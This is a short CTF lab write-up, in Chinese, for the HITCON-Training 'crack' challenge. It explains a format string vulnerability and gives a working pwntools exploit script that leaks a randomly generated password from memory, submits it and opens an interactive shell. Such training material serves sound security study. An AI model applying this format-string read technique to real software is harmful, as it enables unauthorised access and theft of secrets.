# week2
## hitcon-training -- lab7(crack)
密码是随机生成的 存在格式化字符串漏洞

<img width="264" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/076b02b9-cc70-4179-80f0-a5335602685f">


可以利用格式化字符串读获取password
### exp_crack.py
```python
from pwn import *
p = process("./crack")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

password_addr = 0x804a048

payload = p32(password_addr) + b'#%10$s'
ru('name ? ')
sl(payload)

ru('#')
password = u32(rx(4))
log.info("password ==> {}".format(hex(password)))

ru('password :')
sl(str(password))

shell()

```
